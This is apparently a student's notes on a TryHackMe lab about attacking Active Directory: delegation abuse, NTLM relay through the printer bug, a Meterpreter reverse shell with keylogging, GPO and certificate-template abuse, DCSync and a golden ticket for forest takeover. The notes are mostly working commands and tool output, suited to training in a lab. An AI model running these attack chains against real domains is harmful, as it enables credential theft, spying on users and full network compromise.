# Exploiting AD

## Permission Delegation

Look into bloodhound for possible permission misconfigurations
In this case we can add our user to the IT support groubmember 
```
Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"
```
We then verify the command worked by typing
```
Get-ADGroupMember -Identity "IT Support"
```

After that we can see that the IT Support users can ForceChangePasswords from other users so lets list the Tier 2 Admins and choose one to change their password.
```
Get-ADGroupMember -Identity "Tier 2 Admins" 
```

Lets change the password for the user `t2_ross.bird`
```
$Password = ConvertTo-SecureString "s3curepasswd." -AsPlainText -Force
Set-ADAccountPassword -Identity "trevor.local" -Reset -NewPassword $Password

$UserAccount = Get-LocalUser -Name "trevor.local"
$UserAccount | Set-LocalUser -Password $Password
```

If you get an error changing the password
Sometimes we need to wait 10 minutes for the changes to propegate through the network

## Kerberos Delegations

### Constrained vs Unconstrained
**Unconstrained Delegation** is the least secure method. It provides no limits to the delegation, if a user with the "TRUSTED_FOR_DELEGATION" flag set authenticates to a host with Unconstrained Delegation configure, a TGT for that user account is generated and stored in memory so that it can be later used. If an attacker compromises a user with Unconstrained delegation then he can use the same user to attempt to force a priviliged account to authenticate the host and intercept their generated TGT leading to impersonation.

**Constrained Delegation** is more complex thant unconstrained but still can be used for some powerfull exploitation. If we have access to one of these constrained accounts, by knowing the plaintext password just the NTLM hash of the account, we can generate a TGT for this account and use it to execute TGS request for any non sensitive user account in order to access the service as that user, a good example is impersonating an account with access with a sensitive databse.

### Constrained Delegation Exploitation
*Assuming we already have access to a constrained delegation user*

We can use the Get-NetUser cmdlet of PowerSploit for this enumeration by running the following command:
```
PS C:\>Import-Module C:\Tools\PowerView.ps1 
PS C:\>Get-NetUser -TrustedToAuth
```
Based on the output of this command, we can see that the svcIIS account can delegate the HTTP and WSMAN services on THMSERVER1. You would think that this means we can only access websites on behalf of impersonated users. However, PowerShell Remoting uses the HTTP and WSMAN services as well. The ideal option would be to impersonate a Tier 1 Admin since this would provide us with administrative access over THMSERVER1.

Since we have administrative access now, we can use this to dump LSASecrets, part of the Windows Registry Hive where credentials are stored for features such as Windows services. Let's use Mimikatz to dump the secrets:

```
mimikatz # token::elevate
mimikatz # lsadump::secrets
mimikatz # token::revert
```
- ``token::elevate`` - To dump the secrets from the registry hive, we need to impersonate the SYSTEM user.
- `lsadump::secrets` - Mimikatz interacts with the registry hive to pull the clear text credentials.
Now lets perform a delegation attack with kekeo and mimikatz
We first need to generate a TGT that can be used to generate tickets for the HTTP and WSMAN services:
```
tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
```
- user - The user who has the constrained delegation permissions.
- domain - The domain that we are attacking since Kekeo can be used to forge tickets to abuse cross-forest trust.
- password - The password associated with the svcIIS account. That we got from lsadump::secrets output

Now lets forge a TGS (Ticket Granting Server) for the account we want to impersonate.
We need to do this for both HTTP service and WSMAN
```
kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc

kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc
```

Back to mimikatz lets type:

```
mimikatz # privilege::debug
mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
```
We can exit Mimikatz and run klist if you want to verify that the tickets were imported. Now that the tickets are imported, we can finally create our PSSession on THMSERVER1:

```
mimikatz # exit
PS C:> New-PSSession -ComputerName thmserver1.za.tryhackme.loc
PS C:\> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
```

## Exploiting Automated Relays
We could be in a position where we did not have access to a constrained delegation exploit. This is another excellent attack that can be performed to gain privileged access to hosts. 

All Windows hosts have a machine account. 

Essentially, this is the user account associated with the machine. 
Unless someone tampered with the account of the host, the passwords of these accounts are uncrackable. 

By default, they are 120 characters (UTF16) long and are automatically rotated every 30 days.

In AD, these machine accounts are used quite a bit in different services. 

Different domain controllers use their machine accounts to synchronise AD updates and changes. 

When you request a certificate on behalf of the host you are working on, the machine account of that host is used for authentication to the AD Certificate Service. 

There is an exceptional case in AD, where one machine has admin rights over another machine. 

Essentially in the AD configuration, administrative permissions over a host have been granted to another host. 

Again, this is expected functionality such as domain controllers or SQL clusters that must be synchronised. 

However, these instances provide a very interesting attack vector for coercing authentication.

To identify these machines lets write the following query in bloodhound:
```
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
```

This query will attempt to find instances where a computer has the "AdminTo" relationship over another computer. 
![[Pasted image 20230426131656.png]]
It shows us that the THMSERVER2 machine account has administrative privileges over the THMSERVER1 machine.
### The Printer Bug

The printer bug is a "feature" of the MS-RPRN protocol (PrintSystem Remote Protocol), which allows a domain user to remotely force a target host running the Print Spooler service to authenticate to an arbitrary IP address. 

4 conditions need to be meet to exploit this:
1. A valid set of AD account credentials.
2. Network connectivity to the target's SMB service.
3. The target host must be running the Print Spooler service.
4. The hosts must not have SMB signing enforced.

Conditions 1 and 2 have been meet.

#### 3. Print Spooler Service
We need to determine if the Print Spooler service is running. 

Since we don't have access to THMSERVER2, we need to query from the network perspective. 

In this case, we can use a WMI query from our SSH session on THMWRK1 to query the service's current state:
```
PS C:\> GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc
```
 If we get an access denied error, you could perhaps attempt the PowerShell command of 
```
 Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc
```
 If both give you an error, you may just need to take a leap of faith.

#### SMB signing

In order to relay the coerced authentication attempt, SMB signing should not be enforced. 

It should be noted that there is a difference between SMB signing being allowed and SMB signing being enforced

Since we will be hosting a malicious SMB server, we can ensure our server does not support signing, forcing the target not to sign the SMB authentication attempt.

```
nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
```

We can see that SMB signing is enabled but not enforced based on the output. This means all our conditions are met, and we can start the attack!

### Exploiting Authentication Relays

We will be using the C# exploit for this called SpoolSample. 

This will be used to coecer the THMSERVER2 to authenticate to us in our Kali box and then with `Impacket-ntlmrelayx` we will relay the authentication attempt to THMSERVER1.

Lets set up our NTLM Relay:
```
exzh@kali ~ impacket-ntlmrelayx -smb2support -t smb://"THM1SERVER IP" -debug
```

```ad-note
We need to specify the ip instead of the hostname because if we use the hostname the host can request that we use kerberos authentications instead of NTLM 
```

Back to the server machine.
```
SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"
```

If everything was done correctly the ntlmrelayx output should be giving us the ntlm hashes from the target machine

We can also run commands using ntlmrelayx with 
```
exzh@kali ~ impacket-ntlmrelayx -smb2support -t smb://"THM1SERVER IP" -c 'whoami /all' -debug
```

## Exploiting AD Users

### SYSTEM is Sometimes Too Privileged

Meterpreter has a built-in keylogger. This will be useful for extracting the user's keystrokes. However, we can't just start this keylogger and hope for the best since our shell is currently running in the SYSTEM context. SYSTEM won't be typing any keystrokes, so this won't help us. To capture the correct user's credentials, we will need to ensure that our shell is running in the context of that user.

Fortunately, Meterpreter provides us with a migrate feature, and since we are running as SYSTEM, we should be able to migrate to any process. You have remote code execution on THMSERVER1, use this to get a Meterpreter shell.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1
```

Host a pyhton http server and download the shell.ps1 file from there.

```
sudo msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST "LISTENING IP"
set LPORT "LISTENING PORT"
exploit
```

```
ps | grep "explorer"

migrate "explorer PID here"

```

The `getuid` command should return the .local users and not the AD user.

```
meterpreter > keyscan_start

meterpreter > keyscan_dump
Dumping captured keystrokes...
keep<CR>
<SHIFT>Imreallysurenoonewillguessmypassword<CR>
```
Download the kdbx file located on documents and unlock it with the password you just captured.

```
meterpreter > download PasswordDatabase.kdbx 
```

## Exploiting GPOs

A GPO is a virtual collection of policy settings. Each GPO has a unique name, called a GUID. That's why if you try to read the contents of the SYSVOL directory, it won't make a lot of sense with all the random names.

Each Windows computer has a Local Policy Configuration. 
This contains several notable configurations such as:

- Application configuration for services such as the Firewall, Anti-Virus, and Applocker.
- Local Group membership such as the Administrator or Remote Desktop Users groups.
- Startup configuration such as scripts that should be executed.
- Security and protocol settings such as SMBv1 support.

### Group Policy Management

If you only have one Windows computer, it is easy to change the local policy configuration directly on the host. 

Group Policy Management (GPM) comes into play in large organizations. 

GPM allows us to define policies directly on the AD structure. 
Essentially, we can define GPOs for AD objects, such as a specific OU or group.

Domain-joined computers would then pull all policies from SYSVOL periodically and apply the relevant ones.

By default, policies are replicated every 15 minutes through the gpupdate application. We can, however, also manually execute this application from Command Prompt to apply policies instantly.

### Exploiting GPOs
There are several ways in which GPOs can be exploited, we will stick with the simple solution of adding an AD account we control to both the local Administrators and local Remote Desktop Users groups. 

This will allow us administrative privileges on THMSERVER2 and the ability to RDP in. 

```ad-note
We could also use the exposed SSH port, but not many organisations have upgraded to providing SSH access. Hence, RDP access or conventional lateral movement techniques like SMBExec are safer.
```

To modify the GPO, we need to access Group Policy Management as the AD user that has the relevant permissions

We could RDP into THMSERVER1 as the user, but that may kick the user out of their active session, raising suspicion.

Instead, we will RDP into THMWRK1 with either our normal or our Tier 2 Admin account, inject the AD user's credentials into memory using the runas command, and open MMC to modify the GPO. 

```
runas /netonly /user:za.tryhackme.loc\AD.USERNAME cmd.exe
```

To verify that you provided the correct credentials, we can run `dir \\za.tryhackme.loc\sysvol` 
```
Directory of \\za.tryhackme.loc\sysvol

04/25/2022  07:17 PM    <DIR>          .
04/25/2022  07:17 PM    <DIR>          ..
04/25/2022  07:17 PM    <JUNCTION>     za.tryhackme.loc [C:\Windows\SYSVOL\domain]
               0 File(s)              0 bytes
               3 Dir(s)  51,434,037,248 bytes free

```

In the newly spawned command prompt window, we can start the Microsoft Management Console:
```
C:\>mmc
```
![[Pasted image 20230427135428.png]]
We now want to add the Group Policy Management snap-in:

1. Click File -> Add/Remove Snap-in
2. Select the Group Policy Management snap-in and click Add
3. Click Ok
![[Pasted image 20230427135545.png]]
We can now navigate to the GPO that our user has permission to modify (Servers > Management Servers> Management Server Pushes).
![[Pasted image 20230427135649.png]]
We can right-click on the GPO and select Edit. This will open the new Group Policy Management Editor window.

In order to add our account to the local groups, we need to perform the following steps:

1. Expand Computer Configuration
2. Expand Policies
3. Expand Windows Settings
4. Expand Security Settings
5. Right Click on Restricted Groups and select Add Group (If the IT Support group already exists, it means someone has already performed the exploit. You can either delete it to create it yourself, or just inspect it to see what was configured.)
6. Click Browse, enter IT Support and  click Check Names
7. Click Okay twice
![[Pasted image 20230427155110.png]]

The first filter is not used. For the second filter, we want to add both the Administrators and Remote Desktop Users groups. In the end, it should look something like this:
![[Pasted image 20230427160853.png]]

## Exploiting Certificates

Now that we have access to THMSERVER2, we have furthered our journey of exploiting AD by exploiting all Tier 1 assets (servers). 

However, we are again stuck without the simple means to move to the next tier. So again, we will need to look for more creative paths.

AD CS is used for several things, such as encrypting file systems, creating and verifying digital signatures, and even user authentication, making it a promising avenue for attackers. 

Since AD CS is a privileged function, it usually runs on selected domain controllers
On the other side of the coin, organisations tend to be too large to have an administrator create and distribute each certificate manually.

Administrators of AD CS can create several templates that can allow any user with the relevant permissions to request a certificate themselves. These templates have parameters that say which user can request the certificate and what is required. 

Specific combinations of these parameters can be incredibly toxic and abuse for privilege escalation and persistent access.

Terminology

- PKI - Public Key Infrastructure is a system that manages certificates and public key encryption
- AD CS - Active Directory Certificate Services is Microsofts PKI implementation which usually run on domain controllers.
- CA - Certificate Authority is a PKI that issues certificates
- Certificate Template - a collection of settings and policies that defines how and when a certificate may be issued by a CA
- CSR - Certificate Signing Request is a message sent to a CA to request a signed certificate
- EKU -  Extended/Enhanced Key Usage are object identifiers that define how a generated certificate may be used.

### Finding Vulnerable Certificate Templates

In order to find vulnerable templates, we will use Window's built-in tool certutil. Using our RDP access on THMSERVER2, we can run the following Powershell script to enumerate certificates:

```
C:\>certutil -Template -v > templates.txt
```

We could also use a certificate auditing tool such as Ghostpack's PSPKIAudit. 
However, a manual approach allows us to make sure we find all possible misconfigurations. 

A certificate template is deemed misconfigured if a combination of parameter values becomes poisonous, allowing the requester to perform privilege escalation. 

In our case, we are looking for a template with the following poisonous parameter combination:

- Client Authentication - The certificate can be used for Client Authentication.
-  CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT - The certificate template allows us to specify the Subject Alternative Name (SAN).
- CTPRIVATEKEY_FLAG_EXPORTABLE_KEY - The certificate will be exportable with the private key.
- Certificate Permissions - We have the required permissions to use the certificate template.

### Exploiting a Certificate Template

Using RDP access on THMSERVER2, we will now request our certificate. If you use Remmina and save the config of the RDP connection, please make sure to disable Restricted admin mode. We will use the Microsoft Management Console (MMC):

1. Click Start->run
2. Type mmc and hit enter
3. Click File->Add/Remove Snap-in..
4. Add the Certificates snap-in and make sure to select Computer Account and Local computer on the prompts.
5. Click OK
![[Pasted image 20230427163330.png]]

We will request a personal certificate:

1. Right Click on Personal and select All Tasks->Request New Certificate...
2. Click Next twice to select the AD enrollment policy.
3. You will see that we have one template that we can request, but first, we need to provide additional information.
4. Click on the More Information warning.
5. Change the Subject name Type option to Common Name and provide any value, since it does not matter, and click Add.
6. Change the Alternative name Type option to User principal name.
7. Supply the UPN of the user you want to impersonate. The best would be a DA account such as Administrator@za.tryhackme.loc and click Add.

Your additional information should look something like this:
![[Pasted image 20230427163403.png]]
Once you are happy with it, click Apply and OK. 
Then, select the certificate and click Enroll. You should be able to see your certificate:
![[Pasted image 20230427163534.png]]
The last step is to export our certificate with the private key:

1. Right-click on the certificate and select All Tasks->Export...
2. Click Next, select Yes, export the private key, and click Next.
3. Click Next, then set a password for the certificate since the private key cannot be exported without a password.
4. Click Next and select a location to store the certificate.
5. Click Next and finally click Finish.
#### User impersonation through a Certificate
Now we can finally impersonate a user. To perform this, two steps are required:

- Use the certificate to request a Kerberos ticket-granting ticket (TGT)
- Load the Kerberos TGT into your hacking platform of choice

For the first step, we will be using Rubeus.

```
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:[generated certificatename] /password: /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:[dc ip]
```

```
mimikatz # privilege::debug
mimikatz # kerberos:ptt administrator.kirbi
mimikatz # exit

C:\ > dir \\THMDC.za.tryhackme.loc\c$\
 Volume in drive \\THMDC.za.tryhackme.loc\c$ is Windows                                                                  Volume Serial Number is 1634-22A9                                                                                                                                                                                                               Directory of \\THMDC.za.tryhackme.loc\c$                                                                                                                                                                                                       01/04/2022  08:47 AM               103 delete-vagrant-user.ps1                                                          05/01/2022  09:11 AM               169 dns_entries.csv                                                                  09/15/2018  08:19 AM    <DIR>          PerfLogs                                                                         03/21/2020  09:31 PM    <DIR>          Program Files                                                                    03/21/2020  09:28 PM    <DIR>          Program Files (x86)                                                              05/01/2022  09:17 AM             1,725 thm-network-setup-dc.ps1                                                         04/25/2022  07:13 PM    <DIR>          tmp                                                                              06/14/2022  03:13 PM    <DIR>          Users                                                                            04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]                                                      04/27/2022  08:12 PM    <DIR>          Windows                                                                                         3 File(s)          1,997 bytes                                                                                          7 Dir(s)  51,432,423,424 bytes free      
```

## Exploiting Domain Trusts

Even though we have access to Tier 0 infrastructure, this is still not enough.

We have only exploited the ZA.TRYHACKME.LOC domain. Surely TRYHACKME must have domains for other regions as well? 

Well, if we take control of the root domain, TRYHACKME.LOC, we will be in a position to compromise all of these regional domains. 

### Domain Trusts

Check AD Basics in case you have any doubts about "Forests"

There are two main types of trusts that can be configured between domains:

1. Directional - The direction of the trust flows from a trusting domain to a trusted domain
2. Transitive - The trust relationship expands beyond just two domains to include other trusted domains

It is common to have a root or parent domain in a forest. In our case, this is TRYHACKME.LOC. 

For each regional office, sub or child domains are created, such as ZA.TRYHACKME.LOC or UK.TRYHACKME.LOC. 

This forest configuration will allow the sharing of resources between the ZA and the UK office.

If some user in the UK office requires access to THMSERVER1, we can grant access for the user in the ZA domain. 

This permission delegation works since there is bidirectional trust between ZA and the root domain and the UK and the root domain, essentially creating a transitive trust between ZA and UK.

## KRBTGT and Golden Tickets

KRBTGT is the account used for Microsoft's implementation of Kerberos.

Essentially, this account acts as the service account for the Kerberos Distribution Center (KDC) service, which handles all Kerberos ticket requests. 

This account is used to encrypt and sign all Kerberos tickets for the domain. 
Since the password hash is shared by all domain controllers, they can then verify the authenticity of the received TGT when users request access to resources.

n a Golden Ticket attack, we bypass the KDC altogether and create our own TGTs, essentially becoming a Ticket Granting Server (TGS). 

In order to forge TGTs, we need the following information:

- The FQDN of the domain
- The security identifier (SID) of the domain
- The username of the account we want to impersonate
- The KRBTGT password hash

The first three are usually easy to recover. 

The last one requires a domain compromise since the KRBTGT password hash is only stored on domain controllers. 

Luckily for us, we have just compromised the Tier 0 admins group with a forged certificate, so we are in a position to recover the KRBTGT password hash.

We will again use Mimikatz with a DC Sync to recover the KRBTGT password hash on THMSERVER2:

```
C:\Tools>mimikatz_trunk\x64\mimikatz.exe

mimikatz # privilege::debug
mimikatz # lsadump:dcsync /user:za\krbtgt
[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be the DC server
[DC] 'za\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 4/25/2022 7:18:22 PM
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 16f9af38fca3ada405386b3b57366082
    ntlm- 0: 16f9af38fca3ada405386b3b57366082
.....


```

### Inter-Realm TGTs

Using the KRBTGT password hash, we could now forge a Golden Ticket to access any resource in the child domain. This will also be discussed in more detail in the Persisting AD Notes.

Inter-Realm TGTs are used to provide access to resources in other domains. In our case, we want to exploit the bidirectional trust relationship between the child and parent domain to gain full access to the parent domain.

We will include extra account SIDs from other domains when we construct the Golden Ticket to perform this exploit. Mimikatz can assist with this, allowing us to set the ExtraSids section of the KERB_VALIDATION_INFO structure of the Kerberos TGT.

The key here is that we will exploit the trust the parent domain has with our child domain by adding the SID of the Enterprise Admins (EA) group as an extra SID to our forged ticket for the domain controller of the child domain. 

The EA group belongs to the parent domain and membership to this group essentially grants Administrative privileges over the entire forest! 

The default SID for this group is S-1-5-21-\<RootDomain\>-519. 

Before we can go into exploitation, we first need to recover two SIDs:

- The SID of the child domain controller (THMDC), which we will impersonate in our forged TGT
- The SID of the Enterprise Admins in the parent domain, which we will add as an extra SID to our forged TGT

To recover these SIDs, we can use the AD-RSAT Powershell cmdlets.
```
PS C:\> Get-ADComputer -Identity "THMDC"

DistinguishedName : CN=THMDC,OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc
DNSHostName       : THMDC.za.tryhackme.loc
Enabled           : True
Name              : THMDC
ObjectClass       : computer
ObjectGUID        : bd651750-782b-4b09-93b4-b5987ec7311b
SamAccountName    : THMDC$
SID               : S-1-5-21-3885271727-2693558621-2658995185-1001
UserPrincipalName :
```

We can recover the SID of the Enterprise Admins group using the following command to query the parent domain controller:
```
PS C:\> Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc

DistinguishedName : CN=Enterprise Admins,CN=Users,DC=tryhackme,DC=loc                                                  GroupCategory     : Security                                                                                           GroupScope        : Universal                                                                                          Name              : Enterprise Admins                                                                                  ObjectClass       : group                                                                                              ObjectGUID        : a23ae384-16e8-44d5-9b36-8173c4e0e5de                                                               SamAccountName    : Enterprise Admins                                                                                  SID               : S-1-5-21-3330634377-1326264276-632209373-519
```

Now that we got the SID its to exploit the Domain Trusts

### Exploiting Domain Trusts

```
C:\Tools>mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt
```
We will verify that this ticket works for access to THMDC since it is a valid ticket for the Administrator user of the child domain:
```
dir \\thmdc.za.tryhackme.loc\c$
```
This at least confirms that the Golden Ticket was forged for access to the child DC. 

However, since we specified extra SIDs, we should also now have access to the parent DC:
```
dir \\thmrootdc.tryhackme.loc\c$\
```